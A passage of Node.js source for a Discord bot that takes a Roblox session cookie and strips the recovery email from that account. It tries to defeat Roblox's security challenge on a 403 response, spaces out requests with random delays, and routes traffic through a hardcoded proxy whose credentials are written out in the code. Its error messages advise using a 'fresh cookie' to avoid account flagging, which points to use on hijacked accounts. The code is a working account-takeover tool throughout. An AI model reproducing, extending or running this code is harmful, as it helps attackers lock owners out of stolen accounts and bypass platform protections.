...
async function removeEmailFromAccount(cookie) {
    try {
        ...
        let csrfToken = await getCsrfToken(cleanCookie);
        ...
        // Single attempt to remove email
        const result = await deleteEmailWithChallenge(cleanCookie, csrfToken, emailToDelete);
        ...
        if (result.success) {
            return {
                ...
                result: result.data,
                challengeHandled: result.challengeHandled || false
            };
        }
        ...
        return {
            success: false,
            message: result.error?.message || "Email removal failed",
            code: result.error?.code,
            needsChallenge: result.needsChallenge,
            suggestion: "Account may be flagged. Try: 1) Use fresh cookie 2) Wait 1+ hours 3) Complete normal Roblox activities first"
        };
...
async function getCsrfToken(cookie) {
    try {
        ...
        const response = await rp({
            ...
            proxy: 'http://hpbhwlum:ifhjayiy2wek@38.154.227.167:5868',
            timeout: 15000,
...
async function fetchEmail(cookie, csrfToken) {
    try {
        ...
        console.log("Email fetch response data:", response);
        
        try {
            return JSON.parse(response);
        } catch (e) {
            throw new Error(`Invalid JSON from fetchEmail: ${response}`);
        }
    } catch (error) {
        throw new Error(`Fetch email error: ${error.message}`);
    }
}

// New function that handles challenges
async function deleteEmailWithChallenge(cookie, csrfToken, emailAddress) {
    try {
        // Step 1: Try normal email deletion
        console.log("🗑️ Attempting email deletion...");
        const deleteResult = await deleteEmail(cookie, csrfToken, emailAddress);
        
        // Check if we got an error response or 403 status
        if (deleteResult && (deleteResult.statusCode === 403 || deleteResult.error || deleteResult.success === false)) {
            console.log("❌ Email deletion blocked - Status:", deleteResult.statusCode);
            
            // If we have exact 403 response from Roblox, try to use it as challenge data
            if (deleteResult.statusCode === 403 && deleteResult.exactRobloxResponse) {
                console.log("🔧 Attempting to handle exact 403 response as challenge...");
                console.log("🔧 Exact Roblox 403 response:", typeof deleteResult.exactRobloxResponse === 'string' ? 
                    `Base64 data (${deleteResult.exactRobloxResponse.length} chars)` : 
                    JSON.stringify(deleteResult.exactRobloxResponse, null, 2));
                
                // If the response is a JSON object with challenge info, extract it
                if (typeof deleteResult.exactRobloxResponse === 'object' && deleteResult.exactRobloxResponse.errors) {
                    console.log("🔧 Found JSON challenge in 403 response");
                    
                    // Extract challenge info from the JSON response
                    const challengeInfo = extractChallengeInfo(deleteResult.exactRobloxResponse);
                    if (challengeInfo) {
                        // Use proper actionType for email removal
                        challengeInfo.actionType = "EmailUpdate.Remove";
                        const challengeResult = await solveChallenge(cookie, csrfToken, challengeInfo);
                        if (challengeResult.success) {
                            console.log("✅ JSON challenge solved, retrying email deletion...");
                            const retryResult = await deleteEmailWithChallengeToken(cookie, csrfToken, emailAddress, challengeResult.token);
                            return {
                    ...
                    // If it's binary data, try using it directly as dataExchangeBlob
                    console.log("🔧 Using exact binary response as dataExchangeBlob");
                    
                    const challengeInfo = {
                        challengeId: "roblox_403_" + Date.now(),
                        actionType: "EmailUpdate.Remove",  // Use proper actionType
                        challengeMetadata: {
                            dataExchangeBlob: deleteResult.exactRobloxResponse
                        }
                    };
                    
                    const challengeResult = await solveChallenge(cookie, csrfToken, challengeInfo);
                    if (challengeResult.success) {
                        console.log("✅ Binary challenge solved, retrying email deletion...");
                        const retryResult = await deleteEmailWithChallengeToken(cookie, csrfToken, emailAddress, challengeResult.token);
                        return {
                            success: retryResult.success,
                            data: retryResult.data,
            ...
            return {
                success: false,
                error: { 
                    message: "Email deletion blocked by Roblox security", 
                    code: "SecurityBlocked",
        ...
        if (deleteResult && deleteResult.errors && deleteResult.errors.length > 0) {
            ...
            // Step 2: Check if it's a challenge error (403 with challenge info)
            if (error.code === 'ChallengeRequired' || error.message?.toLowerCase().includes('challenge')) {
                console.log("🛡️ Challenge detected, extracting challenge info...");
                
                // Step 2: Extract challenge information
                const challengeInfo = extractChallengeInfo(deleteResult);
                if (!challengeInfo) {
                    return {
                        success: false,
                        error: error,
                ...
                console.log("🎯 Challenge info extracted:", challengeInfo);
                ...
                if (!challengeResult.success) {
                    return {
                        success: false,
                        error: { message: "Failed to solve challenge", code: "ChallengeFailed" },
                        needsChallenge: true
                    };
                }
                
                console.log("✅ Challenge solved, retrying email deletion...");
                
                // Step 4: Retry email deletion with challenge token
                const retryResult = await deleteEmailWithChallengeToken(cookie, csrfToken, emailAddress, challengeResult.token);
            ...
            return {
                success: false,
                error: error,
                needsChallenge: error.code === 'ChallengeRequired'
            };
        }
        
        // Only consider it successful if we get a 200/204 status and no errors
        if (deleteResult && (deleteResult.statusCode === 200 || deleteResult.statusCode === 204) && !deleteResult.error) {
            return {
                success: true,
                data: deleteResult,
            ...
            return {
                success: false,
                error: { message: "Unexpected response format", data: deleteResult },
        ...
        return {
            success: false,
            error: { message: error.message, code: "RequestFailed" },
            needsChallenge: false
        };
    }
}

// Extract challenge information from error response
function extractChallengeInfo(response) {
    try {
        const error = response.errors?.[0];
        if (!error) return null;
        
        // Look for challenge info in different possible locations
        const challengeData = error.challengeMetadata || error.challenge || response.challengeMetadata;
        
        if (challengeData) {
            return {
                unifiedCaptchaId: challengeData.unifiedCaptchaId,
                challengeId: challengeData.challengeId || challengeData.id,
                actionType: "EmailUpdate.Remove",  // Always use correct actionType for email removal
                challengeMetadata: challengeData
            };
        }
        
        // Fallback: try to extract from error message or other fields
        if (error.fieldData || error.metadata) {
            const metadata = error.fieldData || error.metadata;
            return {
        ...
        console.error("Failed to extract challenge info:", e);
        return null;
    }
}

// Solve the challenge with proper decompression and proxy support
async function solveChallenge(cookie, csrfToken, challengeInfo) {
    try {
        console.log("🔧 Solving challenge...");
        
        // Decompress challenge data if it's compressed
        let captchaBlob = null;
        
        // Check if challengeMetadata is compressed (base64 encoded compressed data)
        if (typeof challengeInfo.challengeMetadata === 'string') {
            try {
                // Try to decompress if it's gzip compressed base64
                const zlib = require('zlib');
                const buffer = Buffer.from(challengeInfo.challengeMetadata, 'base64');
                const decompressed = zlib.gunzipSync(buffer);
                const decompressedData = JSON.parse(decompressed.toString());
                console.log("✅ Challenge metadata decompressed successfully:", decompressedData);
                
                // Extract captcha blob from decompressed data
                captchaBlob = decompressedData.dataExchangeBlob || decompressedData;
            } catch (decompError) {
                console.log("⚠️ Challenge metadata doesn't need decompression or failed to decompress, using original");
                // If decompression fails, try to use original data directly
                captchaBlob = challengeInfo.challengeMetadata.dataExchangeBlob || challengeInfo.challengeMetadata;
            }
        } else if (challengeInfo.challengeMetadata && challengeInfo.challengeMetadata.dataExchangeBlob) {
            captchaBlob = challengeInfo.challengeMetadata.dataExchangeBlob;
        } else {
            captchaBlob = challengeInfo.challengeMetadata;
        }
        
        // Build payload according to the Roblox API format
        const payload = {
            challengeId: challengeInfo.challengeId,
            actionType: challengeInfo.actionType || "EmailUpdate.Remove",
            challengeMetadata: {
                dataExchangeBlob: captchaBlob
            }
        };
        
        console.log("🔧 Sending challenge request with payload:", JSON.stringify(payload, null, 2));
        ...
        const response = await rp({
            url: "https://auth.roblox.com/v2/challenge",
            method: "POST",
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken,
        ...
        console.log("Challenge response status:", response.statusCode);
        console.log("Challenge response:", response.body);
        
        // Handle compressed response
        let challengeResult;
        try {
            if (response.body && typeof response.body === 'string' && response.body.includes('�')) {
                console.log("⚠️ Challenge response appears compressed, attempting decompression...");
                const zlib = require('zlib');
                const buffer = Buffer.from(response.body, 'binary');
                
                try {
                    // Try Brotli first
                    let decompressed = zlib.brotliDecompressSync(buffer);
                    challengeResult = JSON.parse(decompressed.toString());
                    console.log("✅ Challenge response decompressed successfully with Brotli");
                } catch (brotliError) {
                    console.log("⚠️ Brotli failed, trying gzip...");
                    try {
                        let decompressed = zlib.gunzipSync(buffer);
                        challengeResult = JSON.parse(decompressed.toString());
                        console.log("✅ Challenge response decompressed successfully with gzip");
                    } catch (gzipError) {
                        console.log("⚠️ Gzip failed, trying deflate...");
                        try {
                            let decompressed = zlib.inflateSync(buffer);
                            challengeResult = JSON.parse(decompressed.toString());
                            console.log("✅ Challenge response decompressed successfully with deflate");
                        } catch (deflateError) {
                            console.log("❌ All decompression methods failed");
                            challengeResult = { error: "Failed to decompress response with all methods" };
                        }
                    }
                }
            } else {
                challengeResult = response.body ? JSON.parse(response.body) : {};
            }
        } catch (parseError) {
            console.error("Failed to parse challenge response:", parseError);
            challengeResult = { error: "Invalid response format" };
        }
        
        console.log('Challenge result:', challengeResult);
        
        // Check if challenge passed successfully
        if (response.statusCode === 200 && challengeResult && !challengeResult.error) {
            console.log("✅ Challenge passed successfully");
            return {
                success: true,
                token: challengeResult.challengeToken || challengeResult.token || "challenge_success_" + Date.now()
            };
        } else {
            console.log("❌ Challenge failed:", challengeResult.error || "Unknown error");
            return {
                success: false,
                error: challengeResult.error || "Challenge verification failed"
            };
        }
...
// Retry email deletion with challenge token
async function deleteEmailWithChallengeToken(cookie, csrfToken, emailAddress, challengeToken) {
    try {
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
        ...
        const response = await rp({
            ...
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
                "X-CSRF-TOKEN": csrfToken,
                "X-Challenge-Token": challengeToken, // Add challenge token
                "Content-Type": "application/json",
                Accept: "application/json, text/plain, */*",
        ...
        console.log("Email deletion with challenge - Status:", response.statusCode);
        console.log("Email deletion with challenge - Response:", response.body);
        
        if (response.statusCode === 200 || response.statusCode === 204) {
            return {
                success: true,
                data: response.body ? JSON.parse(response.body) : { success: true }
            };
        } else {
            const errorData = response.body ? JSON.parse(response.body) : {};
            return {
                success: false,
                error: { message: "Email deletion failed after challenge", data: errorData }
            };
        }
        ...
        return {
            success: false,
            error: { message: `Email deletion with challenge error: ${error.message}` }
        };
    }
}

async function deleteEmail(cookie, csrfToken, emailAddress) {
    try {
        // Add longer delay before the actual delete request
        ...
        console.log("Delete email response status:", response.statusCode);
        
        // Handle compressed/garbled responses with proper decompression
        let responseData;
        try {
            // Check if response is likely compressed or binary
            if (response.body && typeof response.body === 'string' && response.body.includes('�')) {
                console.log("Delete email response data: [Binary/Compressed data detected - attempting decompression]");
                ...
                try {
                    ...
                    // Try Brotli first (most likely for modern Roblox responses)
                    try {
                        decompressed = zlib.brotliDecompressSync(buffer);
                        console.log("✅ Successfully decompressed with Brotli");
                    } catch (brotliError) {
                        console.log("⚠️ Brotli decompression failed, trying gzip...");
                        ...
                        try {
                            ...
                            console.log("⚠️ Gzip decompression failed, trying deflate...");
                            
                            // Try deflate if gzip fails
                            try {
                                decompressed = zlib.inflateSync(buffer);
                                console.log("✅ Successfully decompressed with deflate");
                            } catch (deflateError) {
                                throw new Error("Failed to decompress with Brotli, gzip, and deflate");
                            }
                        }
                    }
                    
                    const decompressedText = decompressed.toString();
                    console.log("✅ Decompressed response content:", decompressedText);
                    
                    responseData = decompressedText ? JSON.parse(decompressedText) : {};
                } catch (decompError) {
                    console.log("❌ Failed to decompress response:", decompError.message);
                    
                    // If decompression fails and it's a 403, store the exact raw response
                    if (response.statusCode === 403) {
                        console.log("🔧 Storing exact 403 response for challenge handling...");
                        
                        // Store the exact response body as Roblox sent it
                        let exactResponseData;
                        
                        // Try to parse as JSON first (in case it's actually JSON)
                        try {
                            exactResponseData = JSON.parse(response.body);
                            console.log("✅ 403 response is JSON:", JSON.stringify(exactResponseData, null, 2));
                        } catch (jsonError) {
                            // If not JSON, store as base64 encoded binary
                            const buffer = Buffer.from(response.body, 'binary');
                            exactResponseData = buffer.toString('base64');
                            console.log("✅ 403 response stored as base64, length:", exactResponseData.length);
                        }
                        
                        responseData = { 
                            error: "403 response from Roblox",
                            statusCode: response.statusCode,
                            success: false,
                            exactRobloxResponse: exactResponseData,  // Store exact response
                            binaryData: exactResponseData  // Keep for backward compatibility
                        };
                    } else {
                        responseData = { 
                            error: "Response appears to be compressed but failed to decompress with all methods",
                            statusCode: response.statusCode,
                            success: false
                        };
                    }
                ...
                console.log("Delete email response data:", response.body);
                responseData = response.body ? JSON.parse(response.body) : {};
            }
        } catch (e) {
            console.log("Failed to parse response, treating as error");
            responseData = {
                success: false,
        ...
        // Always include the status code in the response
        responseData.statusCode = response.statusCode;
        
        // Mark as unsuccessful if we get 403 or other error codes
        if (response.statusCode === 403) {
            responseData.success = false;
            responseData.error = responseData.error || "Request blocked by Roblox security (403 Forbidden)";
        } else if (response.statusCode >= 400) {
            responseData.success = false;
            responseData.error = responseData.error || `HTTP Error ${response.statusCode}`;
        ...
        throw new Error(`Delete email error: ${error.message}`);
    }
}
...
client.on('interactionCreate', async interaction => {
  ...
  if (interaction.commandName === 'bypass2008') {
    ...
    await interaction.reply({ content: '<:yes:1393890949960306719> Processing email removal request...', ephemeral: true });
    ...
    try {
      ...
      const embed = new EmbedBuilder()
        ...
        .setDescription("Email removal results")
        .addFields(
